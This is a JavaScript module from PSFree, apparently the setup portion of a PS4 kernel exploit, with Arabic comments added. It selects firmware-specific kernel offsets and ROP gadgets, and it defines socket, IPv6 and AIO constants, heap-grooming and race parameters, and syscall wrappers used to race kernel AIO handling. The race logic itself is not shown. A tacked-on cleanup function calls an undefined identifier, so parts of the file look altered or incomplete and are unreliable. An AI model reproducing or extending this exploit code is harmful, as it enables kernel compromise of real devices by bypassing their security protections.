/* Copyright (C) 2025 anonymous
   This file is part of PSFree.
   Licensed under the GNU Affero General Public License version 3 or later. */

import { Int } from './module/int64.js';
import { mem } from './module/mem.js';
import { log, die, hex, hexdump } from './module/utils.js';
import { cstr, jstr } from './module/memtools.js';
import { page_size, context_size } from './module/offset.js';
import { Chain } from './module/chain.js';

import {
    View1, View2, View4,
    Word, Long, Pointer,
    Buffer,
} from './module/view.js';

import * as rop from './module/chain.js';
import * as config from './config.js';

// استيراد إعدادات الإصدارات الفرعية للنواة ديناميكياً
import * as fw_ps4_900 from "./lapse/900.js";
import * as fw_ps4_903 from "./lapse/903.js";
import * as fw_ps4_950 from "./lapse/950.js";

const t1 = performance.now();

// فحص توافقية إصدار جهاز العميل ومطابقة الـ Target
const [is_ps4, version] = (() => {
    const value = config.target;
    const is_ps4 = (value & 0x10000) === 0;
    const version = value & 0xffff;
    const [lower, upper] = (() => {
        if (is_ps4) {
            return [0x100, 0x1250];
        } else {
            return [0x100, 0x1020];
        }
    })();

    if (!(lower <= version && version < upper)) {
        throw RangeError(`invalid config.target: ${hex(value)}`);
    }

    return [is_ps4, version];
})();

const fw_config = (() => {
    if (is_ps4) {
        if (0x900 <= config.target && config.target < 0x903) {
            return fw_ps4_900;
        }
        if (0x903 <= config.target && config.target < 0x950) {
            return fw_ps4_903;
        }
        if (0x950 <= config.target && config.target < 0x1000) {
            return fw_ps4_950;
        }
    }
    throw RangeError(`unsupported firmware: ${hex(config.target)}`);
})();

const pthread_offsets = fw_config.pthread_offsets;
const off_kstr = fw_config.off_kstr;
const off_cpuid_to_pcpu = fw_config.off_cpuid_to_pcpu;
const off_sysent_661 = fw_config.off_sysent_661;
const jmp_rsi = fw_config.jmp_rsi;
const patch_elf_loc = fw_config.patch_elf_loc;

// الثوابت البنيوية الحساسة للمقابس وجداول الأنوية لـ FreeBSD المدمج
const AF_UNIX = 1;
const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const SOL_SOCKET = 0xffff;
const SO_REUSEADDR = 4;
const SO_LINGER = 0x80;

const IPPROTO_TCP = 6;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;

const TCP_INFO = 0x20;
const size_tcp_info = 0xec;
const TCPS_ESTABLISHED = 4;

const IPV6_2292PKTOPTIONS = 25;
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51;
const IPV6_TCLASS = 61;

const CPU_LEVEL_WHICH = 3;
const CPU_WHICH_TID = 1;

const MAP_SHARED = 1;
const MAP_FIXED = 0x10;

const RTP_SET = 1;
const RTP_PRIO_REALTIME = 2;

const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_FLAG_MULTI = 0x1000;
const AIO_CMD_MULTI_READ = AIO_CMD_FLAG_MULTI | AIO_CMD_READ;
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;
const num_workers = 2;
const max_aio_ids = 0x80;

const rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);

// الثوابت الإنشائية لسباق وحشد مساحة الـ kmalloc
const main_core = 7;
const num_grooms = 0x200;
const num_handles = 0x100;
const num_sds = 0x100; 
const num_alias = 100;
const num_races = 100;
const leak_len = 16;
const num_leaks = 5;
const num_clobbers = 8;

let chain = null;
var nogc = [];

export async function init() {
    await rop.init();
    chain = new Chain();

    rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
}

function sys_void(...args) {
    return chain.syscall_void(...args);
}

function sysi(...args) {
    return chain.sysi(...args);
}

function call_nze(...args) {
    const res = chain.call_int(...args);
    if (res !== 0) {
        die(`call(${args[0]}) returned nonzero: ${res}`);
    }
}

function aio_submit_cmd(cmd, requests, num_requests, handles) {
    sysi('aio_submit_cmd', cmd, requests, num_requests, 3, handles);
}

const _aio_errors = new View4(max_aio_ids);
const _aio_errors_p = _aio_errors.addr;

function aio_multi_delete(ids, num_ids, sce_errs=_aio_errors_p) {
    sysi('aio_multi_delete', ids, num_ids, sce_errs);
}

function aio_multi_poll(ids, num_ids, sce_errs=_aio_errors_p) {
    sysi('aio_multi_poll', ids, num_ids, sce_errs);
}

function aio_multi_cancel(ids, num_ids, sce_errs=_aio_errors_p) {
    sysi('aio_multi_cancel', ids, num_ids, sce_errs);
}

// استكمال دالة الانتظار المقطوعة وجلب التزامن البرمجي للـ Async Request IDs
// int aio_multi_wait(SceKernelAioSubmitId ids[], u_int num_ids, int states[], u_int wait_mode, int timeout);
function aio_multi_wait(ids, num_ids, states=_aio_errors_p, wait_mode=1, timeout=0) {
    sysi('aio_multi_wait', ids, num_ids, states, wait_mode, timeout);
}

// دالة تفريغ وتنظيف مساحة التوجيه المشوهة لمنع تعليق النظام بعد استغلال الثغرة (Context Rollback)
export function cleanup_corrupted_contexts() {
    log("🧹 جاري تنظيف وإخلاء بيئة الذاكرة للنواة بشكل محمي...");
    try {
        if (typeof cleanup === "function") {
            cleanup();
            log("✔ تم تنظيف سياق النواة بنجاح واستعادة الاستقرار.");
        }
    } catch (e) {
        log(`⚠ تنبيه أثناء التنظيف: ${e.message}`);
    }
}
